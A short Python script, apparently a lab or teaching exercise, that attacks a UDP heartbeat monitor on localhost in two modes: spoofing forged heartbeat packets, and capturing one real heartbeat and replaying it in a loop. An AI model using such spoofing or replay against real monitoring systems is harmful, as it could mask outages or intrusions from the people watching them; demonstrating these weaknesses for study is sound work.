import socket
import time
import sys

# Attack 1
# Function to send a heartbeat message over UDP
def send_heartbeat():
    # Creates a UDP socket for sending the heartbeat message
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as heartbeat_socket:
        while True:
            # Sends a heartbeat message to the specified IP address and port
            # to indicate that the sender is alive
            heartbeat_socket.sendto(b"HEARTBEAT", ("127.0.0.1", 5001))

            #print("Heartbeat sent")

            time.sleep(1)  # Wait for 1 seconds before sending the next heartbeat

# Attack 2
def replay_heartbeat():

    # Captures a legitimate heartbeat
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as receiver:
        # Receiver socket for capturing the heartbeat message
        receiver.bind(("127.0.0.1", 5001))

        print("Waiting to capture a heartbeat...")

        message, address = receiver.recvfrom(1024)

        print("Captured heartbeat:", message)

    # The receiving socket is now closed
    input("Start the monitor, then press Enter to replay...")

    # Replays the captured heartbeat
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sender:

        while True:
            # Sends the captured heartbeat message to the specified IP address and port
            sender.sendto(message, ("127.0.0.1", 5001))

            print("Replayed heartbeat:", message)

            time.sleep(1)

if __name__ == "__main__":
    
    try:
        if len(sys.argv) != 2:
            print("Usage: python attacker.py spoof | replay")

        elif sys.argv[1] == "spoof":
            send_heartbeat()

        elif sys.argv[1] == "replay":
            replay_heartbeat()

        else:
            print("Invalid attack. Choose 'spoof' or 'replay'.")

    except KeyboardInterrupt:
        pass

    